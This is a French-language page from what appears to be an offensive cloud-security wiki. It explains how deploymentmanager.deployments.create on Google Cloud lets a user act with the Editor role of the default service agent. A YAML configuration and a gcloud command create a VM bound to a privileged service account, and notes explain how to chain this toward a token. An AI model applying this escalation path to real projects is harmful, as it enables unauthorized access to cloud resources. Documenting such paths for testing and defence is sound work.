---
title: "Deployment Manager : déployer en tant qu'agent de service Editor par défaut"
description: "Créer un déploiement Deployment Manager avec deploymentmanager.deployments.create, qui s'exécute en tant qu'agent de service Google APIs détenant Editor par défaut."
keywords:
  - Deployment Manager
  - deployments.create
  - agent de service Google APIs
  - Editor
  - actAs
  - déploiement
---

# Deployment Manager

Les déploiements Deployment Manager s'exécutent en tant qu'**agent de service Google APIs** (`<project-number>@cloudservices.gserviceaccount.com`), qui détient le rôle `roles/editor` sur le projet par défaut. Avec `deploymentmanager.deployments.create`, vous déployez une configuration qui crée une ressource vous accordant un accès, empruntant de fait Editor sans détenir `actAs` sur un compte de service normal.

## Déployer une configuration qui escalade

```yaml
# escalate.yaml: have the Editor service agent grant you a role, or create a
# VM/function bound to a privileged account
resources:
  - name: pwn-vm
    type: compute.v1.instance
    properties:
      zone: <zone>
      machineType: zones/<zone>/machineTypes/e2-small
      serviceAccounts:
        - email: <privileged-sa>@<project>.iam.gserviceaccount.com
          scopes: [ "https://www.googleapis.com/auth/cloud-platform" ]
      # ... disks / network ...
```

```bash
gcloud deployment-manager deployments create pwn --config=escalate.yaml
```

## Notes d'exploitation

- L'Editor par défaut de l'agent de service est le point clé : le déploiement crée des ressources que vous ne pourriez pas créer directement, en s'exécutant en tant qu'Editor.
- Editor ne peut pas définir de politique IAM, enchaînez donc vers une ressource qui produit un jeton (une VM ou une fonction liée à un compte privilégié) plutôt que d'attendre un octroi direct d'Owner.
- Deployment Manager est en cours de retrait au profit d'Infrastructure Manager ; la technique persiste partout où l'API est encore activée.

## Outils

- **gcloud** (`deployment-manager deployments create`) : le déploiement.
- **GCP-IAM-Privilege-Escalation** (Rhino) : documente le chemin Editor de l'agent de service.

## Références

- [Rhino Security Labs : escalade de privilèges GCP (partie 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [Escalade de privilèges GCP IAM (dépôt Rhino)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [Google : contrôle d'accès Deployment Manager](https://cloud.google.com/deployment-manager/docs/access-control)
